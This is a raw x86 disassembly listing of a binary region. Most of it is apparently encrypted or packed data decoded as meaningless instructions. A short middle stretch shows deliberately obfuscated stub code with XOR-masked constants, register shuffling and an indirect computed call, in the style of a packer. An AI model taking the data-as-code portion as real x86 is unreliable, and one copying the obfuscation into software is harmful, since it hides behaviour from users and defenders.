  40cdf1:	push   edx
  40cdf2:	push   edx
  40cdf3:	sub    BYTE PTR [edi-0x60cc921e],ch
  40cdf9:	(bad)  
  40cdfa:	pushf  
  40cdfb:	push   edi
  40cdfc:	retf   0xeec2
  40cdff:	cmp    al,BYTE PTR [ebp+0x79]
  40ce02:	inc    ecx
  40ce03:	cmp    al,0x99
  40ce05:	and    eax,0x9baca23d
  40ce0a:	jg     0x40ce70
  40ce0c:	mov    esi,0x8008a526
  40ce11:	or     bh,ch
  40ce13:	sbb    BYTE PTR [edx],al
  40ce15:	stos   DWORD PTR es:[edi],eax
  40ce16:	stc    
  40ce17:	mov    bl,BYTE PTR [eax+0x587178be]
  40ce1d:	jae    0x40cdc9
  40ce1f:	(bad)  
  40ce20:	mov    ebx,0xf92b7a2e
  40ce25:	adc    al,0xa0
  40ce27:	sti    
  40ce28:	icebp  
  40ce29:	fld    DWORD PTR fs:[ebx+0x1915808a]
  40ce30:	jp     0x40ce8f
  40ce32:	or     al,0x60
  40ce34:	shl    DWORD PTR [ebp+0x5f],cl
  40ce37:	fsubr  DWORD PTR [esi+0x47]
  40ce3a:	in     eax,dx
  40ce3b:	lds    eax,FWORD PTR [ecx-0x77]
  40ce3e:	bound  esi,QWORD PTR [edi+0x63]
  40ce41:	and    al,0x71
  40ce43:	dec    ebx
  40ce44:	loopne 0x40cdfd
  40ce46:	sub    eax,ebp
  40ce48:	fld    QWORD PTR [edx+0x5448c3a9]
  40ce4e:	repz fnstsw WORD PTR [ebp-0x7c]
  40ce52:	xchg   ebp,eax
  40ce53:	ins    BYTE PTR es:[edi],dx
  40ce54:	mov    cl,0x3e
  40ce56:	enter  0x90ab,0x94
  40ce5a:	fnstcw WORD PTR [esi]
  40ce5c:	or     ah,BYTE PTR [esi-0xa5fcd59]
  40ce62:	pop    ss
  40ce63:	leave  
  40ce64:	enter  0xc91e,0x45
  40ce68:	aaa    
  40ce69:	or     BYTE PTR [edx+ecx*8-0x6f],ah
  40ce6d:	mov    ebx,0xd0b2cc31
  40ce72:	jo     0x40ceb6
  40ce74:	lea    ebx,[ebp+0x1f]
  40ce77:	mov    ah,0x39
  40ce79:	mov    BYTE PTR [esi],cl
  40ce7b:	push   cs
  40ce7c:	cli    
  40ce7d:	adc    eax,0x24facb06
  40ce82:	xchg   edi,eax
  40ce83:	int3   
  40ce84:	shl    BYTE PTR [esi+0x59],0xd0
  40ce88:	adc    ebx,edx
  40ce8a:	in     al,0xa9
  40ce8c:	adc    eax,ecx
  40ce8e:	add    eax,0xba49b8ce
  40ce93:	mov    ah,0x30
  40ce95:	sub    BYTE PTR [esp+ebp*2+0xb],ah
  40ce99:	or     cl,BYTE PTR [eax+0x2b]
  40ce9c:	adc    al,0x71
  40ce9e:	dec    ebp
  40ce9f:	ss and ebp,0x35da1572
  40cea6:	and    eax,0x48525d2c
  40ceab:	in     al,0x74
  40cead:	mov    edi,0x3b18bf17
  40ceb2:	fsubr  st,st(2)
  40ceb4:	mov    ds:0xc1dc854a,eax
  40ceb9:	sub    ecx,ebx
  40cebb:	or     bl,BYTE PTR ds:0xefdfe8a8
  40cec1:	mov    eax,ds:0x6f11627
  40cec6:	push   esp
  40cec7:	mov    WORD PTR [eax+0x6fceab56],ds
  40cecd:	pop    ebx
  40cece:	pop    ds
  40cecf:	ss sahf 
  40ced1:	pop    eax
  40ced2:	sbb    eax,0x958336f5
  40ced7:	pushf  
  40ced8:	test   al,0xa
  40ceda:	ja     0x40ce86
  40cedc:	mov    dh,BYTE PTR ds:0xc17363d
  40cee2:	add    BYTE PTR [edi],cl
  40cee4:	hlt    
  40cee5:	or     eax,0xb2ed0ff5
  40ceea:	xchg   DWORD PTR [ecx+esi*8+0x6f],ebp
  40ceee:	add    DWORD PTR [esi-0x79],0x30
  40cef2:	adc    BYTE PTR [ebx],bl
  40cef4:	push   es
  40cef5:	pop    eax
  40cef6:	add    al,0xf0
  40cef8:	ins    BYTE PTR es:[edi],dx
  40cef9:	sbb    dh,BYTE PTR [esi-0x19]
  40cefc:	lods   al,BYTE PTR ds:[esi]
  40cefd:	and    eax,0x62ae59d9
  40cf02:	mov    WORD PTR [eax*8+0x4fd885d5],?
  40cf09:	test   al,0x45
  40cf0b:	xchg   edx,eax
  40cf0c:	xchg   esi,eax
  40cf0d:	xor    BYTE PTR [edx*8-0x241ee615],dh
  40cf14:	call   0x476eb52
  40cf19:	push   ss
  40cf1a:	lods   eax,DWORD PTR ds:[esi]
  40cf1b:	pop    esi
  40cf1c:	inc    edx
  40cf1d:	popa   
  40cf1e:	jle    0x40cf7a
  40cf20:	(bad)  
  40cf21:	mov    bh,0x1e
  40cf23:	and    al,0xdb
  40cf25:	add    al,0xe8
  40cf27:	or     al,0xd1
  40cf29:	push   ss
  40cf2a:	pop    ebp
  40cf2b:	and    eax,DWORD PTR [edx]
  40cf2d:	inc    edi
  40cf2e:	je     0x40cf18
  40cf30:	faddp  st(5),st
  40cf32:	cmc    
  40cf33:	ret    
  40cf34:	lock ficomp WORD PTR [edi-0x77]
  40cf38:	in     eax,0xe5
  40cf3a:	mov    dh,0x56
  40cf3c:	ja     0x40cfbc
  40cf3e:	xchg   ebp,eax
  40cf3f:	cmp    DWORD PTR [esi],edx
  40cf41:	push   ebp
  40cf42:	out    0xc3,al
  40cf44:	outs   dx,BYTE PTR ds:[esi]
  40cf45:	aas    
  40cf46:	test   BYTE PTR [ebp-0x18],ch
  40cf49:	mov    esi,0xfbd0693f
  40cf4e:	or     BYTE PTR [edi-0x4],0x54
  40cf52:	cmp    cl,BYTE PTR [edi+edx*8+0x72]
  40cf56:	popf   
  40cf57:	pop    eax
  40cf58:	add    dl,ch
  40cf5a:	adc    al,0x88
  40cf5c:	xor    ch,BYTE PTR [esi]
  40cf5e:	jmp    0x40cf3b
  40cf60:	jle    0x40cef7
  40cf62:	data16 adc BYTE PTR [ecx-0x2163f0fd],0xe
  40cf6a:	cmp    ebp,ecx
  40cf6c:	loop   0x40cf0e
  40cf6e:	(bad)  
  40cf6f:	sar    eax,cl
  40cf71:	add    al,0x4a
  40cf73:	scas   al,BYTE PTR es:[edi]
  40cf74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf75:	lahf   
  40cf76:	aam    0x37
  40cf78:	rcr    DWORD PTR [ecx],cl
  40cf7a:	sbb    al,0x9d
  40cf7c:	pop    ecx
  40cf7d:	loopne 0x40cfba
  40cf7f:	jmp    0xec90:0xa4b8407
  40cf86:	adc    eax,0xc48b3c5f
  40cf8b:	jle    0x40cf4b
  40cf8d:	push   esi
  40cf8e:	mov    BYTE PTR [edi-0x5ebbe6bc],ch
  40cf94:	adc    DWORD PTR [ebx+ebx*8],edi
  40cf97:	or     al,0x62
  40cf99:	scas   eax,DWORD PTR es:[edi]
  40cf9a:	daa    
  40cf9b:	xor    DWORD PTR [ecx+0x40],0x59
  40cf9f:	mov    DWORD PTR [ecx],edx
  40cfa1:	push   ecx
  40cfa2:	and    DWORD PTR [ecx],eax
  40cfa4:	xchg   edx,eax
  40cfa5:	mov    eax,0xefc7e14b
  40cfaa:	mov    WORD PTR [esi+0x6dd3d241],es
  40cfb0:	cmc    
  40cfb1:	or     ah,al
  40cfb3:	ja     0x40cfa2
  40cfb5:	repz out 0x37,al
  40cfb8:	les    ebx,FWORD PTR [ebx+0x2f]
  40cfbb:	push   edi
  40cfbc:	or     ah,BYTE PTR [esi+esi*1-0x42]
  40cfc0:	retf   0x1422
  40cfc3:	and    esi,DWORD PTR [esi+0x1a]
  40cfc6:	cmc    
  40cfc7:	inc    ecx
  40cfc8:	sar    cl,cl
  40cfca:	jne    0x40d033
  40cfcc:	hlt    
  40cfcd:	daa    
  40cfce:	ss pop ebx
  40cfd0:	mov    dh,0x18
  40cfd2:	push   edi
  40cfd3:	(bad)  
  40cfd4:	lock mov edx,0x2604d3e0
  40cfda:	call   0xe77:0x67d35903
  40cfe1:	push   esi
  40cfe2:	fld    st(4)
  40cfe4:	les    ecx,FWORD PTR [edx-0x47]
  40cfe7:	cld    
  40cfe8:	sbb    ebp,DWORD PTR [ebx+0x139bba66]
  40cfee:	(bad)  
  40cfef:	cmc    
  40cff0:	rol    BYTE PTR [ebx-0x44],1
  40cff3:	sbb    DWORD PTR [ebp-0x2b49dd8e],0xffffffa1
  40cffa:	dec    edi
  40cffb:	lahf   
  40cffc:	repnz rol BYTE PTR [ebp-0x1e],0x48
  40d001:	retf   
  40d002:	sbb    eax,0x7bd7f76f
  40d007:	ss cmp al,0x20
  40d00a:	mov    DWORD PTR [ebx+ebx*4],edi
  40d00d:	and    edx,DWORD PTR [ecx]
  40d00f:	test   al,0x5f
  40d011:	or     BYTE PTR [ebp+0x51],ch
  40d014:	push   ds
  40d015:	sub    eax,0x99cf6800
  40d01a:	out    dx,eax
  40d01b:	rol    BYTE PTR [eax-0x1680fd62],0xc7
  40d022:	dec    ecx
  40d023:	ret    
  40d024:	mov    bh,0x31
  40d026:	adc    ah,bl
  40d028:	push   ss
  40d029:	imul   ebx,DWORD PTR [esi+0x1b],0x36c0446f
  40d030:	mov    ds:0xcd5b3c5d,al
  40d035:	pop    esi
  40d036:	push   edi
  40d037:	icebp  
  40d038:	xchg   ebx,eax
  40d039:	jns    0x40d02b
  40d03b:	retf   0xb7e4
  40d03e:	stc    
  40d03f:	pop    edi
  40d040:	in     eax,dx
  40d041:	daa    
  40d042:	dec    esp
  40d043:	or     ebp,edx
  40d045:	ja     0x40d0c4
  40d047:	mov    al,ds:0x10e9568
  40d04c:	mov    ebp,0x9c2a3249
  40d051:	bound  edi,QWORD PTR [ebp-0x57]
  40d054:	xor    edi,DWORD PTR [edi]
  40d056:	and    eax,0xf86ae59f
  40d05b:	mov    ah,0x93
  40d05d:	inc    edx
  40d05e:	jae    0x40d0be
  40d060:	je     0x40d00e
  40d062:	jae    0x40d065
  40d064:	ja     0x40d0c2
  40d066:	sbb    DWORD PTR [ebp+0x17],edi
  40d069:	pop    esp
  40d06a:	lods   eax,DWORD PTR ds:[esi]
  40d06b:	push   es
  40d06c:	fcomp  DWORD PTR [edx-0x7a]
  40d06f:	jecxz  0x40cff2
  40d071:	imul   esi,DWORD PTR [esi+0x47956db8],0x44
  40d078:	push   ebx
  40d079:	imul   edx,DWORD PTR [eax+0x18],0xffffffaa
  40d07d:	aas    
  40d07e:	imul   DWORD PTR [esi-0x18]
  40d081:	sbb    ebp,DWORD PTR [ebp+0x4e]
  40d084:	jo     0x40d0d3
  40d086:	call   0x7c0f:0xc64f67ca
  40d08d:	sub    DWORD PTR [ebx+0x7a],edi
  40d090:	and    dl,ah
  40d092:	pop    eax
  40d093:	xchg   esp,eax
  40d094:	xchg   esp,eax
  40d095:	neg    BYTE PTR [ebx+edx*8]
  40d098:	outs   dx,DWORD PTR ds:[esi]
  40d099:	std    
  40d09a:	stos   DWORD PTR es:[edi],eax
  40d09b:	push   esi
  40d09c:	stc    
  40d09d:	pop    es
  40d09e:	(bad)  
  40d09f:	(bad)  
  40d0a0:	rol    BYTE PTR [edi-0x23ad13a2],cl
  40d0a6:	in     al,0xb7
  40d0a8:	hlt    
  40d0a9:	mov    bl,0x7c
  40d0ab:	push   edi
  40d0ac:	or     DWORD PTR [edi+0xf],ebx
  40d0af:	fwait
  40d0b0:	gs es push 0x1ae32f19
  40d0b7:	push   eax
  40d0b8:	and    eax,0x628cd642
  40d0bd:	adc    BYTE PTR [ebx-0x45a63041],0x50
  40d0c4:	add    al,0xe4
  40d0c6:	xor    bh,bh
  40d0c8:	inc    edx
  40d0c9:	stc    
  40d0ca:	sub    al,0x93
  40d0cc:	sub    bl,al
  40d0ce:	hlt    
  40d0cf:	mov    edi,ss
  40d0d1:	dec    esi
  40d0d2:	mov    DWORD PTR [esi+ebp*8],ebx
  40d0d5:	inc    esp
  40d0d6:	or     al,0x5a
  40d0d8:	mov    ebx,0x5b711f3e
  40d0dd:	fcomi  st,st(5)
  40d0df:	inc    edx
  40d0e0:	(bad)  
  40d0e1:	lods   eax,DWORD PTR ds:[esi]
  40d0e2:	mov    bh,0x40
  40d0e4:	cmp    DWORD PTR [ebx],esi
  40d0e6:	ror    BYTE PTR [ecx+0x207af407],1
  40d0ec:	adc    esi,eax
  40d0ee:	sub    cl,al
  40d0f0:	sub    cl,dl
  40d0f2:	fild   DWORD PTR [ebx+0x1f57e2f1]
  40d0f8:	pop    ss
  40d0f9:	mov    ebx,edi
  40d0fb:	int3   
  40d0fc:	iret   
  40d0fd:	cmp    DWORD PTR [ebp+0x3a],edx
  40d100:	pusha  
  40d101:	popf   
  40d102:	mov    edx,0x856169bb
  40d107:	sbb    dl,BYTE PTR [eax-0x66]
  40d10a:	push   es
  40d10b:	ins    BYTE PTR es:[edi],dx
  40d10c:	fdivr  QWORD PTR [ebx-0x15140fc1]
  40d112:	fsubr  st,st(1)
  40d114:	jg     0x40d0f2
  40d116:	push   esp
  40d117:	push   ebx
  40d118:	add    DWORD PTR [edi+0x52],ebx
  40d11b:	stos   DWORD PTR es:[edi],eax
  40d11c:	dec    ebx
  40d11d:	jmp    esp
  40d11f:	retf   0x5172
  40d122:	mov    cl,0x7f
  40d124:	loope  0x40d0fa
  40d126:	jmp    0x5bc22bd3
  40d12b:	push   eax
  40d12c:	hlt    
  40d12d:	inc    edi
  40d12e:	pop    ebp
  40d12f:	mov    ah,0xa2
  40d131:	xchg   esp,eax
  40d132:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d133:	jmp    0x40d1a5
  40d135:	loope  0x40d15d
  40d137:	cmp    al,ah
  40d139:	out    0xe1,al
  40d13b:	xlat   BYTE PTR ds:[ebx]
  40d13c:	mov    edx,0x863cc7b7
  40d141:	mov    ds:0x74c4da73,eax
  40d146:	dec    esi
  40d147:	inc    ebx
  40d148:	repnz mov esi,0x141aa0f4
  40d14e:	pop    ss
  40d14f:	xchg   BYTE PTR [esi+0x45a82a93],bh
  40d155:	shl    DWORD PTR [ecx],1
  40d157:	dec    eax
  40d158:	push   ds
  40d159:	and    ebx,DWORD PTR [ebx-0x25f8297b]
  40d15f:	sbb    al,0xd2
  40d161:	ret    0x6a74
  40d164:	cmp    ecx,edi
  40d166:	imul   ebp,DWORD PTR [ecx],0x3a9f883e
  40d16c:	pop    eax
  40d16d:	iret   
  40d16e:	push   esi
  40d16f:	dec    edx
  40d170:	lods   eax,DWORD PTR ds:[esi]
  40d171:	add    ebx,DWORD PTR [ebx-0x17]
  40d174:	or     eax,DWORD PTR [ecx+0x6d]
  40d177:	jmp    0x40d144
  40d179:	fld    TBYTE PTR [edx]
  40d17b:	sbb    DWORD PTR [ecx+edi*1-0x7b],edx
  40d17f:	pop    ss
  40d180:	fdivr  st(4),st
  40d182:	inc    eax
  40d183:	push   0x54
  40d185:	dec    ebx
  40d186:	fld    st(5)
  40d188:	or     eax,0xb78d7abe
  40d18d:	mov    ds:0xd6b5185d,eax
  40d192:	ret    
  40d193:	int3   
  40d194:	ret    
  40d195:	ja     0x40d1cf
  40d197:	pop    ds
  40d198:	int3   
  40d199:	mov    esp,0x56f32ef2
  40d19e:	ret    0x36e7
  40d1a1:	(bad)  
  40d1a2:	rep outs dx,DWORD PTR ds:[esi]
  40d1a4:	sub    BYTE PTR [edi+0x4d69d3d5],ch
  40d1aa:	adc    DWORD PTR fs:[ebx-0x141fbe46],ebx
  40d1b1:	pop    edx
  40d1b2:	xchg   DWORD PTR [edx-0x66],edi
  40d1b5:	mov    esi,0x18c0d14b
  40d1ba:	in     eax,dx
  40d1bb:	dec    ebp
  40d1bc:	mov    DWORD PTR [edx],eax
  40d1be:	hlt    
  40d1bf:	repz mov ch,0x3c
  40d1c2:	ret    
  40d1c3:	pop    es
  40d1c4:	mov    DWORD PTR [eax+edi*2-0x2c],esp
  40d1c8:	cld    
  40d1c9:	push   ebp
  40d1ca:	loop   0x40d14d
  40d1cc:	add    al,0x57
  40d1ce:	outs   dx,DWORD PTR ds:[esi]
  40d1cf:	adc    edx,DWORD PTR [esi]
  40d1d1:	or     DWORD PTR [ecx-0x37],ebx
  40d1d4:	shl    DWORD PTR [esi+0x7ad435a8],cl
  40d1da:	adc    ecx,DWORD PTR [esi-0x5cdcb615]
  40d1e0:	call   0xb74c:0x83a094ef
  40d1e7:	xchg   esp,eax
  40d1e8:	retf   0x207a
  40d1eb:	(bad)  
  40d1ec:	adc    edi,DWORD PTR [edx+esi*8-0x70]
  40d1f0:	inc    ebx
  40d1f1:	mov    esi,0xc472294
  40d1f6:	or     bh,bl
  40d1f8:	ins    DWORD PTR es:[edi],dx
  40d1f9:	adc    eax,0x20ffea83
  40d1fe:	(bad)  
  40d200:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d201:	cmp    ecx,DWORD PTR [eax-0x5e4444a8]
  40d207:	add    dl,BYTE PTR [ebx+0x1df2b2f2]
  40d20d:	sbb    al,BYTE PTR [eax]
  40d20f:	shl    BYTE PTR [edi-0x3c0137b9],0xe7
  40d216:	imul   ecx,DWORD PTR [ecx-0x7d],0x191f3c3b
  40d21d:	test   ah,dl
  40d21f:	push   edx
  40d220:	push   ds
  40d221:	or     BYTE PTR [edx+0x31],bh
  40d224:	pop    esp
  40d225:	nop
  40d226:	xor    eax,0xef7a77fb
  40d22b:	sbb    al,0xea
  40d22d:	(bad)  
  40d22e:	outs   dx,DWORD PTR ds:[esi]
  40d22f:	popa   
  40d230:	xor    eax,0xe3a33e9c
  40d235:	xchg   BYTE PTR [esi],bl
  40d237:	or     al,0xec
  40d239:	std    
  40d23a:	sbb    BYTE PTR [ebp+0xf],al
  40d23d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d23e:	mov    al,ds:0x3814a0f2
  40d243:	mov    bh,0x38
  40d245:	ret    0x76b5
  40d248:	aam    0xc2
  40d24a:	out    dx,eax
  40d24b:	cdq    
  40d24c:	leave  
  40d24d:	mov    esp,0xaeb1afcc
  40d252:	inc    ecx
  40d253:	scas   eax,DWORD PTR es:[edi]
  40d254:	lods   eax,DWORD PTR ds:[esi]
  40d255:	cdq    
  40d256:	ret    
  40d257:	push   cs
  40d258:	inc    esi
  40d259:	or     dl,bl
  40d25b:	pop    esi
  40d25c:	pop    ecx
  40d25d:	ror    BYTE PTR es:[edx-0x2],1
  40d261:	lods   eax,DWORD PTR ds:[esi]
  40d262:	mov    dl,0xb8
  40d264:	xchg   esi,eax
  40d265:	pop    ebp
  40d266:	mov    edx,DWORD PTR [edx+0x2acc87e1]
  40d26c:	xlat   BYTE PTR fs:[ebx]
  40d26e:	les    ebx,FWORD PTR [ebx]
  40d270:	sub    BYTE PTR [edx+0x3c3394b3],bh
  40d276:	call   0xffe1:0x90a87c34
  40d27d:	in     al,dx
  40d27e:	mov    DWORD PTR cs:[eax+ecx*2+0x62],edi
  40d283:	dec    esi
  40d284:	les    eax,FWORD PTR [esi-0x36]
  40d287:	cmp    eax,0x90eaaad5
  40d28c:	pop    ss
  40d28d:	cmp    DWORD PTR [ebx],0xffffffcc
  40d290:	push   cs
  40d291:	(bad)  
  40d292:	aad    0x80
  40d294:	std    
  40d295:	jne    0x40d280
  40d297:	test   eax,0x85e4458b
  40d29c:	ror    BYTE PTR [edi],0x84
  40d29f:	xchg   esi,eax
  40d2a0:	add    BYTE PTR [eax],al
  40d2a2:	add    bh,al
  40d2a4:	inc    ebp
  40d2a5:	loopne 0x40d2a7
  40d2a7:	add    BYTE PTR [eax],al
  40d2a9:	add    BYTE PTR [edx+0x58],dl
  40d2ac:	push   0x5
  40d2ae:	sub    edx,eax
  40d2b0:	pop    edx
  40d2b1:	add    edx,0xa
  40d2b4:	push   edx
  40d2b5:	pop    ecx
  40d2b6:	push   0xa
  40d2b8:	dec    ecx
  40d2b9:	pop    ebx
  40d2ba:	dec    ebx
  40d2bb:	xchg   ebx,ecx
  40d2bd:	sub    ebx,ecx
  40d2bf:	xchg   ebx,ecx
  40d2c1:	dec    ecx
  40d2c2:	mov    eax,DWORD PTR [ebp-0x1c]
  40d2c5:	imul   eax,ecx
  40d2c8:	sub    esp,eax
  40d2ca:	mov    DWORD PTR [ebp-0x20],esp
  40d2cd:	mov    eax,DWORD PTR [ebp-0x4]
  40d2d0:	xor    eax,esi
  40d2d2:	add    eax,edi
  40d2d4:	jmp    0x40d312
  40d2d9:	mov    ecx,DWORD PTR [ebp-0xc]
  40d2dc:	mov    eax,DWORD PTR [ebp+0x8]
  40d2df:	mov    edx,DWORD PTR [ebp+0x14]
  40d2e2:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d2e6:	xor    ecx,esi
  40d2e8:	add    ecx,edi
  40d2ea:	xor    edx,edx
  40d2ec:	div    ecx
  40d2ee:	mov    ecx,DWORD PTR [ebp-0x4]
  40d2f1:	xor    ecx,esi
  40d2f3:	lea    eax,[ecx+eax*1+0x3272fa]
  40d2fa:	mov    ecx,DWORD PTR [ebp+0x8]
  40d2fd:	mov    edx,DWORD PTR [ebp-0x20]
  40d300:	mov    DWORD PTR [edx+ecx*4],eax
  40d303:	mov    eax,DWORD PTR [ebp-0xc]
  40d306:	mov    ecx,DWORD PTR [ebp+0x8]
  40d309:	xor    eax,esi
  40d30b:	lea    eax,[eax+ecx*1+0x3272fa]
  40d312:	mov    DWORD PTR [ebp+0x8],eax
  40d315:	mov    eax,DWORD PTR [ebp-0xc]
  40d318:	mov    ecx,DWORD PTR [ebp+0x14]
  40d31b:	xor    eax,esi
  40d31d:	add    eax,edi
  40d31f:	imul   eax,DWORD PTR [ecx]
  40d322:	mov    ecx,DWORD PTR [ebp-0x4]
  40d325:	mov    edx,DWORD PTR [ebp+0x8]
  40d328:	xor    ecx,esi
  40d32a:	lea    ecx,[ecx+edx*1+0x3272fa]
  40d331:	cmp    ecx,eax
  40d333:	jne    0x40d2d9
  40d339:	mov    eax,DWORD PTR [ebp-0x4]
  40d33c:	xor    eax,esi
  40d33e:	add    eax,edi
  40d340:	mov    DWORD PTR [ebp-0x10],eax
  40d343:	and    ebx,0x6547647
  40d349:	xor    ebx,0x8768765
  40d34f:	xchg   ebx,esi
  40d351:	xor    ebx,ebx
  40d353:	push   esi
  40d354:	mov    esi,ebx
  40d356:	pop    ebx
  40d357:	mov    edx,esi
  40d359:	add    ebx,0x1002
  40d35f:	lea    eax,[ebp-0x18]
  40d362:	add    edx,eax
  40d364:	add    edx,0x5
  40d367:	push   edx
  40d368:	inc    esi
  40d369:	pop    ecx
  40d36a:	dec    ecx
  40d36b:	xchg   ecx,eax
  40d36c:	dec    eax
  40d36d:	xchg   ecx,eax
  40d36e:	dec    ecx
  40d36f:	xchg   ecx,edx
  40d371:	dec    edx
  40d372:	push   edx
  40d373:	mov    edx,ebx
  40d375:	pop    ebx
  40d376:	dec    ebx
  40d377:	call   DWORD PTR [ebx]
  40d379:	cmp    DWORD PTR [ebp+0x10],esi
  40d37c:	je     0x40d39d
  40d382:	xchg   edx,eax
  40d383:	push   0xc
  40d385:	pop    ecx
  40d386:	dec    ecx
  40d387:	push   0x3
  40d389:	pop    ebx
  40d38a:	inc    ebx
  40d38b:	xchg   ebx,ecx
  40d38d:	inc    ecx
  40d38e:	sub    ebx,ecx
  40d390:	xchg   ebx,ecx
  40d392:	dec    ecx
  40d393:	dec    ecx
  40d394:	mov    eax,DWORD PTR [ebp-0x1c]
  40d397:	imul   eax,ecx
  40d39a:	add    esp,eax
  40d39c:	xchg   edx,eax
  40d39d:	push   eax
  40d39e:	xor    ebx,ebx
  40d3a0:	mov    edx,esp
  40d3a2:	dec    edx
  40d3a3:	inc    ebx
  40d3a4:	add    ebx,DWORD PTR [edx+ebx*1]
  40d3a7:	dec    ebx
  40d3a8:	xor    edx,edx
  40d3aa:	add    DWORD PTR [ebp-0x10],ebx
  40d3ad:	pop    ebx
  40d3ae:	mov    eax,DWORD PTR [ebp-0x10]
  40d3b1:	pop    edi
  40d3b2:	pop    esi
  40d3b3:	pop    ebx
  40d3b4:	leave  
  40d3b5:	ret    0x10
  40d3b8:	push   ebp
  40d3b9:	mov    ebp,esp
  40d3bb:	push   ecx
  40d3bc:	or     DWORD PTR ds:0x426f29,0x4a1b
  40d3c6:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40d3cd:	movzx  edx,BYTE PTR ds:0x426f19
  40d3d4:	sub    DWORD PTR ds:0x426f21,edx
  40d3da:	mov    eax,DWORD PTR [ebp-0x4]
  40d3dd:	mov    DWORD PTR ds:0x426e91,0x1a
  40d3e7:	cmp    DWORD PTR ds:0x426e91,0x0
  40d3ee:	je     0x40d421
  40d3f4:	cmp    DWORD PTR ds:0x426e91,0x24
  40d3fb:	jl     0x40d421
  40d401:	jmp    0x40d40f
  40d406:	push   DWORD PTR [ebp-0xc]
  40d409:	call   DWORD PTR ds:0x430a2c
  40d40f:	mov    edx,DWORD PTR ds:0x426e91
  40d415:	dec    edx
  40d416:	mov    DWORD PTR ds:0x426e91,edx
  40d41c:	jmp    0x40d3e7
  40d421:	mov    edx,DWORD PTR [ebp+0x10]
  40d424:	xor    ecx,0x6edc
  40d42a:	jmp    0x40f7c6
  40d42f:	mov    ah,0x4a
  40d431:	hlt    
  40d432:	mov    ebx,0x74b46574
  40d437:	ja     0x40d48b
  40d439:	out    dx,al
  40d43a:	je     0x40d4a5
  40d43c:	cli    
  40d43d:	scas   al,BYTE PTR es:[edi]
  40d43e:	or     DWORD PTR [edx],ebx
  40d440:	sub    bh,BYTE PTR [ebx+0x7b]
  40d443:	clc    
  40d444:	pushf  
  40d445:	jnp    0x40d4c2
  40d447:	sub    ecx,DWORD PTR [edi]
  40d449:	stc    
  40d44a:	ret    
  40d44b:	jge    0x40d481
  40d44d:	push   edi
  40d44e:	sbb    ch,BYTE PTR [edi+0x4d]
  40d451:	add    ch,dh
  40d453:	mov    ds:0xfeb11f2f,eax
  40d458:	std    
  40d459:	jg     0x40d408
  40d45b:	fs dec eax
  40d45d:	dec    edx
  40d45e:	xchg   ebx,eax
  40d45f:	popf   
  40d460:	sub    ebx,edi
  40d462:	fisttp DWORD PTR [eax-0x63]
  40d465:	adc    BYTE PTR [ecx],dl
  40d467:	das    
  40d468:	or     DWORD PTR [esi-0x2c4859cf],ebx
  40d46e:	pop    ebp
  40d46f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d470:	or     eax,0x22303e14
  40d475:	(bad)  
  40d476:	mov    ch,0xc8
  40d478:	pop    ebx
  40d479:	or     ax,0x7914
  40d47d:	mov    dh,0xbc
  40d47f:	add    ebp,DWORD PTR [eax+0x55f26b81]
  40d485:	pop    esi
  40d486:	add    DWORD PTR ds:0x86d8d1fb,ebp
  40d48c:	sbb    eax,DWORD PTR [edx-0x7c9815c5]
  40d492:	push   edi
  40d493:	or     DWORD PTR [ebx],0x29f4aeb6
  40d499:	pop    ss
  40d49a:	adc    BYTE PTR cs:[esi],0xe
  40d49e:	cmp    DWORD PTR [esi+0x169671c],ecx
  40d4a4:	mov    ch,0x68
  40d4a6:	pop    ds
  40d4a7:	in     eax,dx
  40d4a8:	aaa    
  40d4a9:	popa   
  40d4aa:	or     eax,DWORD PTR [ebx+0x4273b62a]
  40d4b0:	push   ss
  40d4b1:	out    0xef,al
  40d4b3:	fucomi st,st(4)
  40d4b5:	mov    esi,DWORD PTR [esi+0x66]
  40d4b8:	aad    0xf7
  40d4ba:	jp     0x40d484
  40d4bc:	cmp    DWORD PTR [edi-0x6d96c27f],ecx
  40d4c2:	ins    BYTE PTR es:[edi],dx
  40d4c3:	pushf  
  40d4c4:	lock or edi,DWORD PTR [ecx+0x4c6ee38f]
  40d4cb:	jge    0x40d536
  40d4cd:	js     0x40d475
  40d4cf:	or     DWORD PTR [edi+0x18c8b5c6],esi
  40d4d5:	mov    BYTE PTR [edi],0xfb
  40d4d8:	lods   al,BYTE PTR ds:[esi]
  40d4d9:	pop    esp
  40d4da:	pusha  
  40d4db:	sbb    esp,DWORD PTR [eax-0x1b3b775a]
  40d4e1:	stc    
  40d4e2:	fdiv   QWORD PTR [edi+0x248d6284]
  40d4e8:	mov    bl,0x3c
  40d4ea:	adc    ah,BYTE PTR [esi]
  40d4ec:	cli    
  40d4ed:	ins    DWORD PTR es:[edi],dx
  40d4ee:	call   0x91409169
  40d4f3:	lahf   
  40d4f4:	iret   
  40d4f5:	mov    esp,0xf3cedea9
  40d4fa:	ror    DWORD PTR [ebx+0x373ae577],0x53
  40d501:	stos   DWORD PTR es:[edi],eax
  40d502:	dec    eax
  40d503:	fld    TBYTE PTR [eax-0x66f74cd]
  40d509:	or     esi,DWORD PTR [edx-0x254f398c]
  40d50f:	in     eax,0x28
  40d511:	cmp    DWORD PTR [edx-0x28],eax
  40d514:	cmp    al,0xab
  40d516:	xor    DWORD PTR [ebx+0x5f],0xc69d106c
  40d51d:	cmc    
  40d51e:	int    0x2a
  40d520:	push   edi
  40d521:	loop   0x40d4f0
  40d523:	aaa    
  40d524:	(bad)  
  40d525:	arpl   WORD PTR [ebx-0x5ec50734],ax
  40d52b:	test   ebp,edi
  40d52d:	xor    BYTE PTR [edx+eiz*4],bh
  40d530:	loopne 0x40d50e
  40d532:	jg     0x40d59f
  40d534:	pop    ebx
  40d535:	xchg   BYTE PTR [eax+0xee91264],dl
  40d53b:	fild   WORD PTR [edx]
  40d53d:	retf   0x3db0
  40d540:	push   ebp
  40d541:	fsqrt  
  40d543:	or     BYTE PTR [ecx-0x23],ch
  40d546:	cmp    dh,ch
  40d548:	mov    ah,0x4b
  40d54a:	add    al,0xfd
  40d54c:	mov    eax,0x2df12779
  40d551:	dec    eax
  40d552:	shr    DWORD PTR [edx+0x60],0x18
  40d556:	cmp    eax,0x75b2af87
  40d55b:	in     al,dx
  40d55c:	xchg   edi,eax
  40d55d:	sub    al,0x7c
